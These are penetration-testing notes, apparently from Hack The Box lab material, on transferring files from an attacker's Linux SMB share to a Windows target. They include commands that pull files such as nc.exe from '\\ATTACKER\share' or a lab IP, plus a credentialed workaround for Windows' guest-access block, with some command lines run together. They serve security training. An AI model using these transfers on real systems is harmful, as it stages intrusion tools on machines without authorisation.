- SMB normally use:
	- TCP/445
- Useful when SMB Connectivity exist

---

## Linux --> Windows

- Start SMB Server from Linux Machine
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare
```
- From Windows, Download file from Linux Machine
```powershell
copy \\ATTACKER\share\file.exe
```
### New versions of Windows block unauthenticated guest access
- Example Error
```cmd
C:\htb> copy \\192.168.220.133\share\nc.exe 

You can't access this shared folder because your organization's security policies block unauthenticated guest access. These policies help protect your PC from unsafe or malicious devices on the network.
```
- From Linux machine do this instead
```bash
sudo impacket-smbserver share -smb2support /tmp/smbshare \ -user test -password test1
```
- From Windows
```cmd
net use n: \\ATTACKER\share /user:test test1 copy n:\file.exe
```


